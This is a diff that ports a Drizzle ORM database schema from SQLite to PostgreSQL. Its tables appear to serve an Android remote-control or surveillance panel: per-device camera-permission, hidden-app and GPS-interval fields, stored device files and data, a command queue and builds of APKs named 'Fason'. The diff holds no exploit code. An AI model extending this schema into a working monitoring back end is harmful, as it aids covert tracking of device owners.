@@ -1,35 +1,36 @@
-import { sqliteTable, text, integer, blob, uniqueIndex } from 'drizzle-orm/sqlite-core';
+import { pgTable, text, integer, boolean, timestamp, serial, customType, uniqueIndex } from 'drizzle-orm/pg-core';
+const bytea = customType<{ data: Buffer; driverData: string }>({ dataType() { return 'bytea'; } });
 
-export const user = sqliteTable('user', {
+export const user = pgTable('user', {
   id: text('id').primaryKey(),
   email: text('email').notNull().unique(),
-  emailVerified: integer('email_verified', { mode: 'boolean' }).notNull().default(false),
+  emailVerified: boolean('email_verified').notNull().default(false),
   name: text('name').notNull(),
   image: text('image'),
-  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
-  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
+  createdAt: timestamp('created_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
+  updatedAt: timestamp('updated_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
   role: text('role').notNull().default('user'),
-  banned: integer('banned', { mode: 'boolean' }).default(false),
+  banned: boolean('banned').default(false),
   banReason: text('ban_reason'),
-  banExpires: integer('ban_expires', { mode: 'timestamp' }),
+  banExpires: timestamp('ban_expires', { mode: 'date' }),
   username: text('username').notNull().default(''),
   permissions: text('permissions').notNull().default('[]'),
   isDefault: integer('is_default').default(0),
-  lastLogin: integer('last_login', { mode: 'timestamp' }),
+  lastLogin: timestamp('last_login', { mode: 'date' }),
   deviceSecret: text('device_secret'),
 });
-export const session = sqliteTable('session', {
+export const session = pgTable('session', {
   id: text('id').primaryKey(),
   userId: text('user_id').notNull().references(() => user.id, { onDelete: 'cascade' }),
-  expiresAt: integer('expires_at', { mode: 'timestamp' }).notNull(),
+  expiresAt: timestamp('expires_at', { mode: 'date' }).notNull(),
   token: text('token').notNull().unique(),
   ipAddress: text('ip_address'),
   userAgent: text('user_agent'),
-  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
-  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
+  createdAt: timestamp('created_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
+  updatedAt: timestamp('updated_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
   impersonatedBy: text('impersonated_by'),
 });
-export const account = sqliteTable('account', {
+export const account = pgTable('account', {
   id: text('id').primaryKey(),
   providerId: text('provider_id').notNull(),
   accountId: text('account_id').notNull(),
@@ -37,22 +38,22 @@ export const account = sqliteTable('account', {
   accessToken: text('access_token'),
   refreshToken: text('refresh_token'),
   idToken: text('id_token'),
-  accessTokenExpiresAt: integer('access_token_expires_at', { mode: 'timestamp' }),
-  refreshTokenExpiresAt: integer('refresh_token_expires_at', { mode: 'timestamp' }),
+  accessTokenExpiresAt: timestamp('access_token_expires_at', { mode: 'date' }),
+  refreshTokenExpiresAt: timestamp('refresh_token_expires_at', { mode: 'date' }),
   scope: text('scope'),
   password: text('password'),
-  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
-  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
+  createdAt: timestamp('created_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
+  updatedAt: timestamp('updated_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
 });
-export const verification = sqliteTable('verification', {
+export const verification = pgTable('verification', {
   id: text('id').primaryKey(),
   value: text('value').notNull(),
-  expiresAt: integer('expires_at', { mode: 'timestamp' }).notNull(),
+  expiresAt: timestamp('expires_at', { mode: 'date' }).notNull(),
   identifier: text('identifier').notNull(),
-  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
-  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
+  createdAt: timestamp('created_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
+  updatedAt: timestamp('updated_at', { mode: 'date' }).notNull().$defaultFn(() => new Date()),
 });
-export const clients = sqliteTable('clients', {
+export const clients = pgTable('clients', {
   id: text('id').primaryKey(),
   ownerId: text('owner_id'),
   ip: text('ip').default(''),
@@ -61,19 +62,19 @@ export const clients = sqliteTable('clients', {
   timezone: text('timezone'),
   firstSeen: text('first_seen').$defaultFn(() => new Date().toISOString()),
   lastSeen: text('last_seen').$defaultFn(() => new Date().toISOString()),
-  online: integer('online', { mode: 'boolean' }).default(false),
+  online: boolean('online').default(false),
   reconnectCount: integer('reconnect_count').default(0),
   deviceModel: text('device_model'),
   deviceBrand: text('device_brand'),
   deviceVersion: text('device_version'),
-  fasonHidden: integer('fason_hidden', { mode: 'boolean' }).default(false),
-  cameraPermission: integer('camera_permission', { mode: 'boolean' }).default(false),
+  fasonHidden: boolean('fason_hidden').default(false),
+  cameraPermission: boolean('camera_permission').default(false),
   currentPath: text('current_path').default(''),
   gpsInterval: integer('gps_interval').default(0),
   deviceInfo: text('device_info'),
 });
-export const clientData = sqliteTable('client_data', {
-  id: integer('id').primaryKey({ autoIncrement: true }),
+export const clientData = pgTable('client_data', {
+  id: serial('id').primaryKey(),
   clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
   dataType: text('data_type').notNull(),
   data: text('data').default('[]'),
@@ -81,48 +82,48 @@ export const clientData = sqliteTable('client_data', {
 }, (table) => [
   uniqueIndex('idx_client_data_unique').on(table.clientId, table.dataType),
 ]);
-export const clientFiles = sqliteTable('client_files', {
-  id: integer('id').primaryKey({ autoIncrement: true }),
+export const clientFiles = pgTable('client_files', {
+  id: serial('id').primaryKey(),
   clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
   fileType: text('file_type').notNull(),
   originalName: text('original_name').notNull(),
   mimeType: text('mime_type'),
-  data: blob('data').notNull(),
+  data: bytea('data').notNull(),
   fileSize: integer('file_size').default(0),
   createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
 });
-export const logs = sqliteTable('logs', {
-  id: integer('id').primaryKey({ autoIncrement: true }),
+export const logs = pgTable('logs', {
+  id: serial('id').primaryKey(),
   type: text('type').notNull().default('INFO'),
   category: text('category').notNull().default('SYSTEM'),
   message: text('message').notNull(),
   details: text('details'),
   createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
 });
-export const buildRecords = sqliteTable('build_records', {
-  id: integer('id').primaryKey({ autoIncrement: true }),
+export const buildRecords = pgTable('build_records', {
+  id: serial('id').primaryKey(),
   userId: text('user_id'),
   serverUrl: text('server_url').notNull(),
   homePageUrl: text('home_page_url').notNull(),
   appName: text('app_name').notNull().default('Fason'),
   status: text('status', { enum: ['completed', 'failed'] }).default('completed'),
-  apkData: blob('apk_data'),
+  apkData: bytea('apk_data'),
   fileSize: integer('file_size').default(0),
   createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
   completedAt: text('completed_at'),
 });
-export const settings = sqliteTable('settings', {
+export const settings = pgTable('settings', {
   key: text('key').primaryKey(),
   value: text('value').notNull(),
   updatedAt: text('updated_at').$defaultFn(() => new Date().toISOString()),
 });
-export const loginAttempts = sqliteTable('login_attempts', {
-  id: integer('id').primaryKey({ autoIncrement: true }),
+export const loginAttempts = pgTable('login_attempts', {
+  id: serial('id').primaryKey(),
   ip: text('ip').notNull(),
   identifier: text('identifier').notNull().default(''),
   attemptedAt: text('attempted_at').notNull().$defaultFn(() => new Date().toISOString()),
 });
-export const commands = sqliteTable('commands', {
+export const commands = pgTable('commands', {
   id: text('id').primaryKey(),
   clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
   cmdType: text('cmd_type').notNull(),
@@ -133,7 +134,7 @@ export const commands = sqliteTable('commands', {
   respondedAt: text('responded_at'),
   responseSummary: text('response_summary'),
 });
-export const jwtSecret = sqliteTable('jwt_secret', {
+export const jwtSecret = pgTable('jwt_secret', {
   id: integer('id').primaryKey(),
   secret: text('secret').notNull(),
 });
